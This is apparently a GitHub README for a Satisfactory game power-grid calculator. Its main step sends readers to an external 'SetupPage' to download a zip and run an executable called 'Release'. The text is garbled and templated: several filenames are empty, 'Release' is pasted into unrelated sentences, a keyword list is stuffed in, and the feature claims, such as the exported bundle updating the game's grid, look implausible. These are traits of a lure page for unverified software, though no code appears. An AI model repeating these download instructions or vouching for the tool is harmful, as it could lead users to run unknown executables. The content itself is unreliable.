# Satisfactory-Power-Grid-Calculator

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-ea580c?style=for-the-badge&logo=python&logoColor=white" alt="Download">
  </a>
  <img src="https://img.shields.io/badge/Satisfactory-1.7-4B8BBE?style=flat-square&logo=steam&logoColor=white" alt="Satisfactory">
  <img src="https://img.shields.io/badge/Power-Grid-FFB800?style=plastic&logo=zap&logoColor=black" alt="Power Grid">
  <img src="https://img.shields.io/badge/Calculator-Ready-28A745?style=flat&logo=calculator&logoColor=white" alt="Calculator">
  <img src="https://img.shields.io/badge/Version-2.1.0-1D4ED8?style=for-the-badge&logo=git&logoColor=white" alt="Version">
  <img src="https://img.shields.io/badge/License-MIT-6C757D?style=flat-square&logo=opensource&logoColor=white" alt="License">
</p>

---

## What does the Satisfactory Power Grid Calculator solve?

Ever wondered how many generators, transformers, and power lines you really need to keep a megabase humming without a single flicker? The **Satisfactory-Power-Grid-Calculator** turns those vague estimates into concrete numbers. It reads your factory layout, applies the official power consumption tables, and spits out a ready‑to‑use configuration that can be imported directly into the game’s UI. No more manual spreadsheets, no more guessing‑and‑checking with in‑game diagnostics.

---

## Core Features

| Feature | Description |
|---------|-------------|
| **Profile‑Based Configurations** | Store multiple ``, ``, ``, and `` files for different playstyles (early game, late‑game, megabase). |
| **Workflow Presets** | One‑click presets for common power architectures: *Linear*, *Ring*, *Hybrid* and *Modular* layouts. |
| **Live Validation** | The calculator checks each node against the official power limits and flags overloads before you apply the plan. |
| **Export Bundle** | Generates a compressed bundle that can be dropped into the Satisfactory `Saved/Config` folder, instantly updating your grid. |
| **Cross‑Platform Data** | JSON and CSV export options for integration with external spreadsheet utility or community dashboards. |
| **In‑Game Sync** | Optional hook that reads the current player’s `` to tailor calculations to your existing power network. |

---

## Getting Started

1. **Download the latest release** using the badge above. The zip file contains the executable, a `README.txt`, and the default configuration set.
2. Extract the archive into a folder of your choice.
3. Open `Release`. The first screen prompts you to select a profile (`` is pre‑selected).
4. Input the number of factories, smelters, and any custom machines you plan to run. The calculator will automatically suggest the minimum number of generators, the required transformer tiers, and the total cable length.
5. Review the “Validation” pane – any red warnings indicate a potential overload. Adjust the numbers or switch to a different preset.
6. Press **Export Bundle**. The utility creates a `power_grid_bundle.zip` containing the updated configuration files. Drop this zip into `...\Satisfactory\Saved\Config\` and restart the game.

### Directory Layout (post‑extraction)

    Satisfactory-Power-Grid-Calculator/
    ├─ assets/                     # Icons and UI skins
    ├─ configs/
    │   ├─
    │   ├─
    │   ├─
    │   └─
    ├─ docs/
    │   └─ quick_start.md
    ├─ releases/
    │   └─ power_grid_bundle.zip
    └─ Release

---

## Advanced Usage

### Integration with Community Dashboards

Export the calculation as CSV via **File → Export → CSV**. The output includes columns for *Node ID*, *Power Draw (MW)*, *Generator Needed*, and *Cable Length (m)*. Paste the file into any spreadsheet to generate graphs or feed it into community‑run power‑grid heat maps.

---

## FAQ & Troubleshooting

**Q: The validation pane shows “overload” even though I followed a preset.**
A: Presets assume a baseline of *Mk.1* cables. If you upgraded to *Mk.3* cables in‑game, the calculator may still flag the older limit. Open `` and change `"cableTier": "Mk.3"` to match your actual Release, then recalculate.

**Q: My exported bundle does not change anything in the game.**
A: Ensure the zip’s internal structure mirrors the `Saved/Config` hierarchy. The correct path is `Saved/Config/<profile>/`. Also verify that the game is not running while you replace the files; a restart is required.

**Q: Can I calculate power for a multiplayer session?**
A: Yes. Load the shared `` from the host’s `Saved/Config` folder before running the calculator. The utility will treat the host’s power limits as the baseline for all participants.

**Q: The UI freezes when I input more than 200 factories.**
A: Large factories generate many nodes. Switch the calculation mode to **Batch** under *Settings → Performance* to process the data in chunks. This reduces memory spikes and restores responsiveness.

---

## Contributing & Feedback

The project lives under the MIT license. If you discover a discrepancy in the power tables or have a suggestion for a new preset, open an issue with a reproducible example. Pull requests that add new configuration schemas, improve the validation engine, or enhance the export formats are especially welcome.

**Stay connected:**

- GitHub Issues – for bug reports and feature ideas.
- Discord (Satisfactory Community) – quick questions and live demos.

---

*Keywords:* satisfactory, power, grid, calculator, satisfactory-power, power-grid, grid-calculator, satisfactory-manager, satisfactory-helper, satisfactory-config

---

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```